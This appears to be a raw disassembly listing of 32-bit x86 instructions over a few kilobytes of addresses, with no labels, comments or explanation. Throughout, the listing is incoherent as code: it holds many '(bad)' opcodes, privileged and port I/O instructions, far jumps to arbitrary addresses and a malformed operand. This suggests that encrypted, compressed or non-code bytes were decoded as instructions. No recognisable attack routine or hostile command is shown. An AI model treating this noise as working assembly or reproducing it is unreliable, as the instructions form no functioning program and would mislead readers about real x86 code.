  41a181:	lea    ebx,[edx-0x44]
  41a184:	lds    esi,FWORD PTR [esi]
  41a186:	in     eax,0x35
  41a188:	test   al,0x8f
  41a18a:	retf   
  41a18b:	iret   
  41a18c:	adc    al,0x2a
  41a18e:	cmp    al,0x22
  41a190:	mov    edx,gs
  41a192:	push   eax
  41a193:	loop   0x41a19f
  41a195:	outs   dx,DWORD PTR ds:[esi]
  41a196:	xor    edx,DWORD PTR [edx+0x4d10e285]
  41a19c:	cmp    DWORD PTR [edx+0x49],ecx
  41a19f:	mov    dl,0xc6
  41a1a1:	ret    0x9804
  41a1a4:	popf   
  41a1a5:	sub    bh,BYTE PTR [ebx]
  41a1a7:	pop    ebp
  41a1a8:	inc    esi
  41a1a9:	jecxz  0x41a1ea
  41a1ab:	sub    BYTE PTR [edi-0x49b25705],dh
  41a1b1:	push   edi
  41a1b2:	push   ds
  41a1b3:	push   es
  41a1b4:	das    
  41a1b5:	cmp    BYTE PTR [ebp-0x311e9423],0xfc
  41a1bc:	mov    ch,0x3
  41a1be:	add    al,0xf1
  41a1c0:	jnp    0x41a201
  41a1c2:	dec    esp
  41a1c3:	inc    ecx
  41a1c4:	inc    esp
  41a1c5:	ja     0x41a227
  41a1c7:	test   eax,0x160717d4
  41a1cc:	cmp    edx,DWORD PTR [ecx+0x5ffa5dac]
  41a1d2:	xchg   edi,eax
  41a1d3:	ss test al,0x1e
  41a1d6:	or     ecx,ebx
  41a1d8:	push   ebp
  41a1d9:	mov    esi,0x40e22f63
  41a1de:	xchg   BYTE PTR [edi],cl
  41a1e0:	iret   
  41a1e1:	test   eax,0x8e1fcf2
  41a1e6:	mov    ah,0x9f
  41a1e8:	fstp   DWORD PTR [edx+0x61]
  41a1eb:	and    bl,BYTE PTR [eax-0x27]
  41a1ee:	popa   
  41a1ef:	pop    esi
  41a1f0:	sub    dh,BYTE PTR [edi+0x1b405270]
  41a1f6:	imul   ebx,DWORD PTR [bx+si],0x51433a78
  41a1fd:	dec    ebx
  41a1fe:	sub    al,0x87
  41a200:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a201:	cmp    ch,bh
  41a203:	mov    ebp,0xffb27acc
  41a208:	adc    ebx,DWORD PTR [ebx]
  41a20a:	jmp    0x41a219
  41a20c:	push   ebp
  41a20d:	mov    DWORD PTR [edi+eax*8+0x79],esp
  41a211:	fistp  WORD PTR es:[ebx]
  41a214:	sti    
  41a215:	lds    edx,FWORD PTR [edi+0x5ed5d1b6]
  41a21b:	mov    ah,0xf9
  41a21d:	sub    eax,0x98f307eb
  41a222:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a223:	jg     0x41a23d
  41a225:	dec    ebx
  41a226:	jmp    0xc5d55d78
  41a22b:	mov    ah,0x32
  41a22d:	cmp    BYTE PTR [ebx+0x5d],cl
  41a230:	mov    ch,0xdb
  41a232:	inc    edx
  41a233:	sub    DWORD PTR [ebp-0x6e],edi
  41a236:	xchg   esp,eax
  41a237:	sbb    ah,BYTE PTR [edi+0x6d305052]
  41a23d:	inc    edx
  41a23e:	dec    eax
  41a23f:	xor    edx,DWORD PTR [eax-0x2f]
  41a242:	fld    QWORD PTR [edi]
  41a244:	hlt    
  41a245:	add    ebp,ebp
  41a247:	xchg   esp,eax
  41a248:	mov    bh,0xe5
  41a24a:	mov    ds:0xb70d8229,al
  41a24f:	scas   eax,DWORD PTR es:[edi]
  41a250:	outs   dx,DWORD PTR ds:[esi]
  41a251:	ret    
  41a252:	sub    ecx,DWORD PTR [esi-0x34dee031]
  41a258:	add    cl,BYTE PTR [edi-0x2c]
  41a25b:	repnz data16 mov cl,0x25
  41a25f:	add    edi,DWORD PTR [eax-0x7c33fcf5]
  41a265:	pusha  
  41a266:	cmc    
  41a267:	sub    DWORD PTR [esi+edi*1+0x22],eax
  41a26b:	xor    eax,0xca72576a
  41a270:	or     edi,eax
  41a272:	push   esi
  41a273:	outs   dx,DWORD PTR ds:[esi]
  41a274:	mov    cl,0xd4
  41a276:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a277:	dec    edi
  41a278:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a279:	and    DWORD PTR [edx+0x69],esi
  41a27c:	(bad)  
  41a27d:	sahf   
  41a27e:	xchg   edi,eax
  41a27f:	sti    
  41a280:	fs cwde 
  41a282:	ds cli 
  41a284:	std    
  41a285:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a286:	je     0x41a218
  41a288:	or     esp,edx
  41a28a:	ins    BYTE PTR es:[edi],dx
  41a28b:	cmp    esi,ebp
  41a28d:	imul   BYTE PTR [esi]
  41a28f:	jecxz  0x41a2f7
  41a291:	mov    ebp,0xeb70dc75
  41a296:	bound  edx,QWORD PTR [ecx+0x860a7ce]
  41a29c:	lahf   
  41a29d:	loopne 0x41a2b6
  41a29f:	inc    ebx
  41a2a0:	arpl   WORD PTR [edi-0x3f],bx
  41a2a3:	adc    edx,DWORD PTR [eax]
  41a2a5:	xor    BYTE PTR [ebx],ah
  41a2a7:	ss xor eax,0x9fafb497
  41a2ad:	dec    ebx
  41a2ae:	pop    esi
  41a2af:	int    0xda
  41a2b1:	fmul   DWORD PTR [esi-0x63]
  41a2b4:	xchg   edx,eax
  41a2b5:	mov    ebx,0x501834d6
  41a2ba:	jns    0x41a2d0
  41a2bc:	popf   
  41a2bd:	ja     0x41a29e
  41a2bf:	(bad)  
  41a2c0:	cwde   
  41a2c1:	or     al,0x31
  41a2c3:	ins    BYTE PTR es:[edi],dx
  41a2c4:	jno    0x41a26a
  41a2c6:	xor    BYTE PTR [edi-0x23],dh
  41a2c9:	fsub   st(1),st
  41a2cb:	adc    al,0x2b
  41a2cd:	push   cs
  41a2ce:	mov    ss,WORD PTR [edx-0x44]
  41a2d1:	repnz cmp al,ch
  41a2d4:	jle    0x41a2b0
  41a2d6:	out    dx,al
  41a2d7:	dec    ebx
  41a2d8:	aas    
  41a2d9:	jmp    0xbbac:0x92644a72
  41a2e0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a2e1:	add    al,BYTE PTR [edx+edi*8+0x5a]
  41a2e5:	(bad)  [ecx+0x5f]
  41a2e8:	stos   DWORD PTR es:[edi],eax
  41a2e9:	test   eax,0x6276ef3d
  41a2ee:	aaa    
  41a2ef:	mov    ah,0x74
  41a2f1:	arpl   WORD PTR [ecx-0x59966d06],dx
  41a2f7:	pop    ecx
  41a2f8:	cli    
  41a2f9:	cmp    esi,DWORD PTR [edi+0x1bc4ab20]
  41a2ff:	outs   dx,DWORD PTR ds:[esi]
  41a300:	xor    DWORD PTR [ebx],edi
  41a302:	jg     0x41a2a7
  41a304:	adc    DWORD PTR [edx],ebp
  41a306:	rcr    bh,cl
  41a308:	sub    eax,0x3bb81e58
  41a30d:	push   es
  41a30e:	xor    ebp,DWORD PTR [eax]
  41a310:	push   ecx
  41a311:	adc    DWORD PTR [ecx+ebp*8-0x56d18fd],esi
  41a318:	pop    ds
  41a319:	je     0x41a35b
  41a31b:	daa    
  41a31c:	ins    WORD PTR es:[edi],dx
  41a31e:	pop    ebp
  41a31f:	fcomp  DWORD PTR [bx+si+0x6b27]
  41a324:	mov    ch,0x62
  41a326:	cdq    
  41a327:	out    dx,al
  41a328:	and    ebx,DWORD PTR [esi-0x54]
  41a32b:	cmp    al,0xc8
  41a32d:	sub    bl,BYTE PTR [ecx+0x3773d82b]
  41a333:	add    al,0xf1
  41a335:	aad    0x93
  41a337:	icebp  
  41a338:	jmp    0x2bce:0xc0af0cd1
  41a33f:	adc    DWORD PTR [ecx],ecx
  41a341:	out    0x74,al
  41a343:	ret    
  41a344:	xchg   BYTE PTR ss:[eax],dl
  41a347:	in     al,dx
  41a348:	or     DWORD PTR [edi-0x16],ebp
  41a34b:	lods   al,BYTE PTR ds:[esi]
  41a34c:	adc    eax,0x125ecaee
  41a351:	stc    
  41a352:	call   0x7988edb8
  41a357:	je     0x41a312
  41a359:	iret   
  41a35a:	and    eax,0x38379e5f
  41a35f:	jp     0x41a37c
  41a361:	xchg   BYTE PTR [ebx-0x3897426b],dl
  41a367:	push   0x7a78f890
  41a36c:	repnz cwde 
  41a36e:	sbb    DWORD PTR [edx],esi
  41a370:	pop    edi
  41a371:	cmp    DWORD PTR [edx-0x7a],ebx
  41a374:	aad    0x74
  41a376:	arpl   WORD PTR [ecx],ax
  41a378:	data16 jl 0x41a3eb
  41a37b:	xchg   edx,eax
  41a37c:	pop    esi
  41a37d:	bndstx [ebp+0x1f1b4efa],(bad)
  41a384:	pop    es
  41a385:	dec    eax
  41a386:	or     edx,DWORD PTR [edx-0x31]
  41a389:	lods   al,BYTE PTR ds:[esi]
  41a38a:	adc    BYTE PTR [edi+0x24],0xf8
  41a38e:	inc    ebx
  41a38f:	inc    ebx
  41a390:	add    bh,bl
  41a392:	rcr    DWORD PTR [ecx+0x1dc877],cl
  41a398:	xor    DWORD PTR [ebp-0x28eda75f],0xf
  41a39f:	dec    esp
  41a3a0:	std    
  41a3a1:	sbb    ch,BYTE PTR [ebx]
  41a3a3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a3a4:	mov    edx,ebx
  41a3a6:	add    BYTE PTR [esi],bh
  41a3a8:	fdivr  QWORD PTR ds:0x6ec62c8a
  41a3ae:	inc    esp
  41a3af:	adc    al,0xcf
  41a3b1:	dec    esp
  41a3b2:	shl    BYTE PTR [ebx-0x3cf6fc1a],1
  41a3b8:	int    0x12
  41a3ba:	in     al,dx
  41a3bb:	sub    al,0xa2
  41a3bd:	sbb    al,0x79
  41a3bf:	add    BYTE PTR [edx+ebx*8-0x3f],dh
  41a3c3:	icebp  
  41a3c4:	adc    al,cl
  41a3c6:	scas   al,BYTE PTR es:[edi]
  41a3c7:	push   ss
  41a3c8:	jecxz  0x41a3da
  41a3ca:	xchg   DWORD PTR [edi-0x5430f4cc],eax
  41a3d0:	call   0x9ac531e6
  41a3d5:	dec    ecx
  41a3d6:	jae    0x41a39b
  41a3d8:	adc    bl,0xa4
  41a3db:	mov    edx,0xebb7eca2
  41a3e0:	add    eax,DWORD PTR [ecx]
  41a3e2:	(bad)  
  41a3e3:	retf   0x4889
  41a3e6:	mov    ds:0x6f107d8e,eax
  41a3eb:	dec    ecx
  41a3ec:	or     DWORD PTR [edx+0x3f],esp
  41a3ef:	adc    esi,DWORD PTR [esp+ebp*1]
  41a3f2:	jne    0x41a430
  41a3f4:	cmp    al,0x45
  41a3f6:	int3   
  41a3f7:	imul   esi,DWORD PTR [ebx+0x84e2bef],0x7ed52dc1
  41a401:	int    0xd4
  41a403:	jmp    0x41a3b7
  41a405:	repz pop ebx
  41a407:	dec    ebp
  41a408:	or     ch,BYTE PTR [edi]
  41a40a:	sub    BYTE PTR [edi+ecx*8-0x316f9b02],dl
  41a411:	adc    DWORD PTR [esi],esi
  41a413:	mov    edx,DWORD PTR ds:0x4ace9e1f
  41a419:	jmp    0x4a65:0x2caf80aa
  41a420:	es pop ss
  41a422:	fwait
  41a423:	pop    esi
  41a424:	mov    gs,WORD PTR [ebx-0x77]
  41a427:	and    eax,0xdc0a5d0c
  41a42c:	push   ss
  41a42d:	push   ecx
  41a42e:	into   
  41a42f:	add    DWORD PTR [ecx+0x55],ebx
  41a432:	test   eax,0x19a8212b
  41a437:	mov    WORD PTR [eax],cs
  41a439:	adc    esp,DWORD PTR [edi-0xb51fe7c]
  41a43f:	int    0xba
  41a441:	adc    dl,bh
  41a443:	sub    edx,ebx
  41a445:	jmp    0xd7e5746d
  41a44a:	xor    dh,dl
  41a44c:	inc    edi
  41a44d:	cwde   
  41a44e:	in     al,dx
  41a44f:	mov    cl,0x0
  41a451:	mov    ecx,0x1e554b27
  41a456:	jo     0x41a413
  41a458:	sbb    eax,0x17a5db8f
  41a45d:	or     edi,DWORD PTR [edx]
  41a45f:	std    
  41a460:	push   esp
  41a461:	loopne 0x41a442
  41a463:	shl    DWORD PTR [edi+0x71],0x1
  41a467:	xchg   esp,eax
  41a468:	lock xchg ebp,eax
  41a46a:	xchg   esp,eax
  41a46b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a46c:	mov    bl,0xe3
  41a46e:	sub    dh,al
  41a470:	(bad)  
  41a471:	and    esi,DWORD PTR [edi]
  41a473:	mov    al,ds:0x885d9d5e
  41a478:	scas   eax,DWORD PTR es:[edi]
  41a479:	mov    es,WORD PTR [eax]
  41a47b:	rcr    BYTE PTR [eax+ebp*2],1
  41a47e:	loope  0x41a4f2
  41a480:	ja     0x41a48c
  41a482:	mov    es,WORD PTR [ebx-0x13]
  41a485:	iret   
  41a486:	jl     0x41a45a
  41a488:	(bad)  
  41a489:	push   ecx
  41a48a:	mov    al,0xf0
  41a48c:	cs mov dl,0xd8
  41a48f:	cmc    
  41a490:	jbe    0x41a430
  41a492:	sar    esp,0x14
  41a495:	and    cl,bh
  41a497:	fidiv  DWORD PTR [eax+0x7dc42ca7]
  41a49d:	xor    DWORD PTR [eax*4-0x558fd7f8],eax
  41a4a4:	icebp  
  41a4a5:	adc    al,0x67
  41a4a7:	ja     0x41a430
  41a4a9:	clc    
  41a4aa:	pop    ecx
  41a4ab:	in     al,dx
  41a4ac:	cli    
  41a4ad:	leave  
  41a4ae:	gs push ecx
  41a4b0:	add    DWORD PTR [esp+ebx*8-0x52],0x30
  41a4b5:	pop    ebx
  41a4b6:	cmp    cl,BYTE PTR [edx-0x564cf5b5]
  41a4bc:	into   
  41a4bd:	xchg   edx,eax
  41a4be:	push   DWORD PTR [eax+eax*8]
  41a4c1:	xchg   ebp,eax
  41a4c2:	lea    ecx,[edx+0xa]
  41a4c5:	outs   dx,BYTE PTR ds:[esi]
  41a4c6:	(bad)  
  41a4c7:	out    dx,eax
  41a4c8:	(bad)  
  41a4c9:	push   edi
  41a4ca:	cmp    DWORD PTR [ebp+0x5ede5291],ebx
  41a4d0:	and    DWORD PTR ds:0x2302abde,ecx
  41a4d6:	pop    edx
  41a4d7:	cmp    ah,BYTE PTR [esi]
  41a4d9:	push   0xcc781802
  41a4de:	in     eax,0x40
  41a4e0:	push   ebx
  41a4e1:	xchg   ebp,eax
  41a4e2:	push   esp
  41a4e3:	pop    eax
  41a4e4:	sbb    DWORD PTR [ebp+0x66db7cbd],edi
  41a4ea:	test   BYTE PTR [edi],bl
  41a4ec:	nop
  41a4ed:	adc    DWORD PTR ds:0x10b89dcb,ebp
  41a4f3:	mov    edi,0xa0687e75
  41a4f8:	jmp    0xab241748
  41a4fd:	inc    esp
  41a4fe:	ret    
  41a4ff:	data16 shr BYTE PTR [ebx],1
  41a502:	pop    ss
  41a503:	jle    0x41a564
  41a505:	fs xchg edx,eax
  41a507:	push   ebx
  41a508:	pop    ss
  41a509:	jmp    0x41a565
  41a50b:	inc    ah
  41a50d:	call   0x58e74402
  41a512:	daa    
  41a513:	fist   WORD PTR ds:0x143ea0e5
  41a519:	cs dec ecx
  41a51b:	inc    edx
  41a51c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a51d:	out    dx,al
  41a51e:	mov    eax,0xd9507c87
  41a523:	dec    BYTE PTR [edx-0x31f78ecb]
  41a529:	(bad)  
  41a52b:	out    dx,al
  41a52c:	neg    DWORD PTR [ecx-0x27]
  41a52f:	hlt    
  41a530:	jmp    0x7d85:0xf32a6249
  41a537:	in     al,dx
  41a538:	pusha  
  41a539:	xlat   BYTE PTR ds:[ebx]
  41a53a:	jl     0x41a54f
  41a53c:	mov    al,0xa3
  41a53e:	fnstsw WORD PTR [edx+0x5]
  41a541:	mov    eax,0xb8b9d8aa
  41a546:	sub    BYTE PTR [ecx],ah
  41a548:	jns    0x41a52e
  41a54a:	bound  eax,QWORD PTR [ebp+0x48]
  41a54d:	test   DWORD PTR [ecx],0x50258bfd
  41a553:	xchg   BYTE PTR [edx+0x64],al
  41a556:	gs push edi
  41a558:	and    dl,BYTE PTR [ebp-0x67]
  41a55b:	fwait
  41a55c:	pop    eax
  41a55d:	add    ah,al
  41a55f:	fbld   TBYTE PTR [eax]
  41a561:	mov    al,0x2
  41a563:	out    0x22,eax
  41a565:	dec    eax
  41a566:	mov    DWORD PTR [esi],0x334006cc
  41a56c:	pop    es
  41a56d:	mov    edi,0x466ba218
  41a572:	ja     0x41a5bd
  41a574:	push   ecx
  41a575:	mov    al,ds:0x2edd8e74
  41a57a:	sub    eax,0x8a23f7e4
  41a57f:	addr16 out 0xf8,al
  41a582:	movd   DWORD PTR [ecx],mm7
  41a585:	mov    edx,0x749bb48
  41a58a:	add    eax,0xdc6eb7bd
  41a58f:	add    ecx,edx
  41a591:	dec    ebp
  41a592:	ins    BYTE PTR es:[edi],dx
  41a593:	retf   0x7bf4
  41a596:	bound  ebp,QWORD PTR [edi]
  41a598:	mov    esi,0xefa01544
  41a59d:	cmp    DWORD PTR [eax+eiz*4+0xd19fb1d],ebx
  41a5a4:	mov    WORD PTR [edx-0x17],es
  41a5a7:	xor    al,0x2b
  41a5a9:	hlt    
  41a5aa:	cli    
  41a5ab:	add    eax,0x55f73a2c
  41a5b0:	sbb    al,0xe2
  41a5b2:	in     al,0x62
  41a5b4:	xchg   ebp,eax
  41a5b5:	aas    
  41a5b6:	vpminsw xmm3,xmm4,XMMWORD PTR ds:0x2e0e995
  41a5be:	ret    0xfffb
  41a5c1:	xor    esi,edx
  41a5c3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a5c4:	stc    
  41a5c5:	inc    ecx
  41a5c6:	jl     0x41a613
  41a5c8:	mov    al,ds:0x48840357
  41a5cd:	xchg   esp,eax
  41a5ce:	inc    esp
  41a5cf:	das    
  41a5d0:	retf   0xabed
  41a5d3:	add    BYTE PTR [edx+0x15f90798],dh
  41a5d9:	scas   al,BYTE PTR es:[edi]
  41a5da:	jnp    0x41a629
  41a5dc:	jecxz  0x41a64c
  41a5de:	xchg   DWORD PTR [edi-0x39bcaf4b],esp
  41a5e4:	jne    0x41a57b
  41a5e6:	inc    edx
  41a5e7:	nop
  41a5e8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a5e9:	repz mov dh,0xd1
  41a5ec:	mov    ds:0xdebcd2db,al
  41a5f1:	stos   DWORD PTR es:[edi],eax
  41a5f2:	push   esp
  41a5f3:	(bad)  
  41a5f4:	mov    ebp,0x47c744f5
  41a5f9:	lods   al,BYTE PTR ds:[esi]
  41a5fa:	mov    ds:0x1c0bd78a,eax
  41a5ff:	mov    ecx,0xb732fe8e
  41a604:	dec    eax
  41a605:	mov    al,ds:0x933f6062
  41a60a:	push   eax
  41a60b:	lds    eax,FWORD PTR [eax-0x9]
  41a60e:	icebp  
  41a60f:	cmp    eax,0x64c43d77
  41a614:	or     DWORD PTR [edi-0x2f],0x8
  41a618:	cs inc ebp
  41a61a:	in     eax,0xda
  41a61c:	pop    ecx
  41a61d:	push   ecx
  41a61e:	xlat   BYTE PTR ds:[ebx]
  41a61f:	scas   eax,DWORD PTR es:[edi]
  41a620:	dec    ebp
  41a621:	and    BYTE PTR [edi-0x41],bh
  41a624:	sub    al,0x28
  41a626:	test   bh,0xf8
  41a629:	ja     0x41a5b1
  41a62b:	or     eax,0x530841f5
  41a630:	les    eax,FWORD PTR [edx+0x318a5f42]
  41a636:	mov    dh,0xe7
  41a638:	cmp    bh,dh
  41a63a:	and    esp,ebx
  41a63c:	mov    edi,0xf49d05dd
  41a641:	xchg   edi,eax
  41a642:	fld    DWORD PTR [ebp+0x35093f1b]
  41a648:	jl     0x41a685
  41a64a:	mov    ecx,0x3b6355f5
  41a64f:	out    dx,eax
  41a650:	sahf   
  41a651:	xor    DWORD PTR [ecx-0x2a],ebx
  41a654:	std    
  41a655:	mov    ebx,0x2f729ec2
  41a65a:	add    dl,cl
  41a65c:	mov    BYTE PTR [ebx+0x21584ee5],cl
  41a662:	adc    al,0xed
  41a664:	xchg   ebp,eax
  41a665:	mov    dl,0x28
  41a667:	push   ebp
  41a668:	adc    eax,0xa9ba386d
  41a66d:	cmc    
  41a66e:	rcl    ecx,cl
  41a670:	or     ecx,DWORD PTR [edx]
  41a672:	daa    
  41a673:	je     0x41a666
  41a675:	xchg   ecx,ebp
  41a677:	test   al,0x90
  41a679:	xchg   esi,ebp
  41a67b:	aam    0xb2
  41a67d:	test   DWORD PTR [ecx-0x343418ae],ebx
  41a683:	add    ecx,edx
  41a685:	pop    es
  41a686:	in     eax,0x6
  41a688:	xchg   DWORD PTR [ebx],ebp
  41a68a:	mov    eax,0xb3c520a2
  41a68f:	rol    DWORD PTR [edx+0x42],cl
  41a692:	aam    0xd1
  41a694:	aam    0xa3
  41a696:	push   edi
  41a697:	jb     0x41a68a
  41a699:	or     esi,DWORD PTR [ebx]
  41a69b:	push   esp
  41a69c:	sbb    eax,0xa00085e1
  41a6a1:	fwait
  41a6a2:	(bad)  
  41a6a3:	loopne 0x41a704
  41a6a5:	inc    eax
  41a6a6:	pop    ss
  41a6a7:	xlat   BYTE PTR ds:[ebx]
  41a6a8:	into   
  41a6a9:	fdiv   QWORD PTR [edi+0x24]
  41a6ac:	xchg   ecx,eax
  41a6ad:	adc    ah,BYTE PTR [ebx-0xaee2022]
  41a6b3:	mov    esp,0xb36c130e
  41a6b8:	(bad)  
  41a6b9:	fcomp  DWORD PTR [ebx+0x44]
  41a6bc:	cld    
  41a6bd:	jp     0x41a724
  41a6bf:	mov    ch,0x21
  41a6c1:	clc    
  41a6c2:	dec    esp
  41a6c3:	outs   dx,BYTE PTR ds:[esi]
  41a6c4:	pop    esp
  41a6c5:	dec    ebp
  41a6c6:	and    DWORD PTR [edx+0x1d],0xb75b694e
  41a6cd:	push   es
  41a6ce:	or     al,0x68
  41a6d0:	ror    BYTE PTR ss:[esi],1
  41a6d3:	lods   al,BYTE PTR ds:[esi]
  41a6d4:	je     0x41a74a
  41a6d6:	pop    eax
  41a6d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a6d8:	stos   DWORD PTR es:[edi],eax
  41a6d9:	pop    esi
  41a6da:	into   
  41a6db:	dec    ebx
  41a6dc:	repnz mov DWORD PTR [ebp-0x7b4fd76],esi
  41a6e3:	mov    al,ds:0x4fcd83df
  41a6e8:	inc    eax
  41a6e9:	cmp    eax,0x5c8a0402
  41a6ee:	pop    es
  41a6ef:	xchg   BYTE PTR [ecx+0x29b807d8],bh
  41a6f5:	adc    BYTE PTR [edx-0x406b138],dh
  41a6fb:	sbb    cl,al
  41a6fd:	push   cs
  41a6fe:	push   esp
  41a6ff:	push   0xffffffa3
  41a701:	cs inc eax
  41a703:	inc    ebx
  41a704:	sti    
  41a705:	scas   al,BYTE PTR es:[edi]
  41a706:	mov    edi,0xe767a2ab
  41a70b:	or     ebx,DWORD PTR [ecx+edx*8-0x3b]
  41a70f:	jl     0x41a756
  41a711:	mov    WORD PTR [esi+0x7c],?
  41a714:	inc    ebp
  41a715:	jmp    0x1f064938
  41a71a:	call   0xe895:0x1adc6ad5
  41a721:	jb     0x41a777
  41a723:	xchg   ah,cl
  41a725:	pop    edi
  41a726:	adc    eax,0x57603772
  41a72b:	push   edx
  41a72c:	data16 sub al,0xff
  41a72f:	das    
  41a730:	or     edi,DWORD PTR [esi]
  41a732:	push   0x7d80f4aa
  41a737:	je     0x41a70d
  41a739:	xchg   edx,eax
  41a73a:	in     eax,0x41
  41a73c:	sub    esp,DWORD PTR [ebp+0x52fc67d6]
  41a742:	add    DWORD PTR [ebp-0x5b02f020],ebx
  41a748:	sub    al,0x1c
  41a74a:	clc    
  41a74b:	paddusb mm2,mm5
  41a74e:	mov    cs,WORD PTR [eax]
  41a750:	mov    dl,0x5
  41a752:	add    al,0xea
  41a754:	push   ebp
  41a755:	dec    ebp
  41a756:	sub    DWORD PTR [ebp+0x5f],edx
  41a759:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a75a:	femms  
  41a75c:	icebp  
  41a75d:	cmp    dl,BYTE PTR [ecx-0x34]
  41a760:	sahf   
  41a761:	mov    cl,0x23
  41a763:	pop    ds
  41a764:	and    ch,BYTE PTR ss:[edi-0x7b]
  41a768:	cld    
  41a769:	jle    0x41a767
  41a76b:	into   
  41a76c:	jle    0x41a7cf
  41a76e:	mov    ah,0x87
  41a770:	cld    
  41a771:	mov    bl,0xa4
  41a773:	lock cdq 
  41a775:	push   ebx
  41a776:	mov    ah,0xc4
  41a778:	push   edi
  41a779:	inc    ecx
  41a77a:	add    BYTE PTR [edx],cl
  41a77c:	call   0x745d320a
  41a781:	scas   al,BYTE PTR es:[edi]
  41a782:	scas   al,BYTE PTR es:[edi]
  41a783:	jns    0x41a7b3
  41a785:	push   0x6d
  41a787:	sbb    BYTE PTR [bx-0x12b2],bh
  41a78c:	pop    esp
  41a78d:	stos   DWORD PTR es:[edi],eax
  41a78e:	jno    0x41a739
  41a790:	cmp    cl,BYTE PTR [ebp+0x666b6638]
  41a796:	gs inc ebp
  41a798:	out    0x11,al
  41a79a:	sti    
  41a79b:	xchg   esi,eax
  41a79c:	xchg   ecx,eax
  41a79d:	shr    DWORD PTR [ebp-0x3a],1
  41a7a0:	inc    edx
  41a7a1:	mov    edi,0x2b6206bf
  41a7a6:	pop    ss
  41a7a7:	mov    al,ds:0xef8edd26
  41a7ac:	cmp    esp,0xfffffff5
  41a7af:	addr16 push ds
  41a7b1:	inc    edi
  41a7b2:	out    0xdd,eax
  41a7b4:	fsubr  st,st(7)
  41a7b6:	inc    eax
  41a7b7:	xor    BYTE PTR [edi+0x55],0xd5
  41a7bb:	mov    DWORD PTR [ebx-0x57],ebx
  41a7be:	out    0xf4,eax
  41a7c0:	mov    BYTE PTR [ebx-0x648e4f06],al
  41a7c6:	cmp    bl,ch
  41a7c8:	xchg   esp,eax
  41a7c9:	sbb    DWORD PTR [ebp+0x4a],edx
  41a7cc:	cs mov bh,0x97
  41a7cf:	pop    ecx
  41a7d0:	unpcklps xmm7,XMMWORD PTR [ebx]
  41a7d3:	pop    ebp
  41a7d4:	test   al,0x66
  41a7d6:	pop    esp
  41a7d7:	sub    BYTE PTR [esi+0x63],ch
  41a7da:	mov    dl,0xf6
  41a7dc:	mov    BYTE PTR [ebx+0x24],bh
  41a7df:	dec    ecx
  41a7e0:	push   esi
  41a7e1:	call   FWORD PTR [ecx]
  41a7e3:	pop    eax
  41a7e4:	adc    BYTE PTR [esi],al
  41a7e6:	outs   dx,BYTE PTR ds:[esi]
  41a7e7:	pop    DWORD PTR [ecx+0x6a]
  41a7ea:	or     al,0x34
  41a7ec:	xchg   esp,eax
  41a7ed:	sar    BYTE PTR [eax],1
  41a7ef:	pop    esp
  41a7f0:	jnp    0x41a869
  41a7f2:	mov    esi,0xc14e947f
  41a7f7:	clc    
  41a7f8:	out    dx,eax
  41a7f9:	int3   
  41a7fa:	and    BYTE PTR [ebx+edi*2+0x1c],dh
  41a7fe:	aas    
  41a7ff:	add    al,0xc4
  41a801:	mov    ch,0xb
  41a803:	xchg   ebp,eax
  41a804:	dec    eax
  41a805:	inc    esp
  41a806:	aam    0x1e
  41a808:	sub    bh,BYTE PTR [eax-0x50dbc2b5]
  41a80e:	popa   
  41a80f:	jb     0x41a7b3
  41a811:	push   edi
  41a812:	inc    esp
  41a813:	cs ret 
  41a815:	hlt    
  41a816:	add    esp,DWORD PTR [ebx+esi*2]
  41a819:	(bad)  
  41a81a:	sbb    eax,esp
  41a81c:	loope  0x41a804
  41a81e:	add    DWORD PTR [edx+0xf2cb9a],0xf42ccc44
  41a828:	aad    0xe9
  41a82a:	mov    ch,0x1
  41a82c:	sbb    edi,DWORD PTR [edi+0x69dba1c6]
  41a832:	repz pop ecx
  41a834:	and    BYTE PTR [ecx+esi*8-0x1f],bh
  41a838:	sub    ch,BYTE PTR [edi]
  41a83a:	lock adc DWORD PTR [ebx-0x38],ebx
  41a83e:	push   es
  41a83f:	mov    ds:0x92138df5,al
  41a844:	loopne 0x41a8a3
  41a846:	je     0x41a840
  41a848:	aaa    
  41a849:	sbb    eax,0x373e354d
  41a84e:	inc    edi
  41a84f:	pop    ecx
  41a850:	aas    
  41a851:	aas    
  41a852:	ja     0x41a7d8
  41a854:	jne    0x41a8a1
  41a856:	pop    ds
  41a857:	(bad)  
  41a858:	sub    eax,DWORD PTR [ebp+edx*8-0x38]
  41a85c:	lods   al,BYTE PTR fs:[esi]
  41a85e:	jne    0x41a897
  41a860:	push   ecx
  41a861:	sub    eax,0x62cd545e
  41a866:	int    0x84
  41a868:	push   0x57
  41a86a:	jg     0x41a8b4
  41a86c:	ror    BYTE PTR [edi+0xf72a430],cl
  41a872:	mov    eax,0x78f3e82b
  41a877:	enter  0x6377,0x3
  41a87b:	push   ss
  41a87c:	inc    eax
  41a87d:	xchg   ecx,eax
  41a87e:	sbb    DWORD PTR [esi+0x25907397],ecx
  41a884:	pop    ebp
  41a885:	test   dl,cl
  41a887:	pop    ds
  41a888:	stos   DWORD PTR es:[edi],eax
  41a889:	fdiv   DWORD PTR [eax+0x50]
  41a88c:	push   edi
  41a88d:	and    al,0x4c
  41a88f:	xor    al,0xf0
  41a891:	ds xchg esi,eax
  41a893:	in     eax,0x25
  41a895:	add    al,ch
  41a897:	in     eax,dx
  41a898:	call   0x22ab556e
  41a89d:	cmp    BYTE PTR ss:[ebx+eiz*1-0x5],bh
  41a8a2:	xchg   ebx,eax
  41a8a3:	sub    DWORD PTR [edx+0x1b],esp
  41a8a6:	jno    0x41a870
  41a8a8:	mov    DWORD PTR ds:[esi-0x6875eb39],0x3d48f0c3
  41a8b3:	inc    eax
  41a8b4:	add    dh,bl
  41a8b6:	mov    ss,WORD PTR [ebp+0x295830c8]
  41a8bc:	stc    
  41a8bd:	fnsave [edx-0x47]
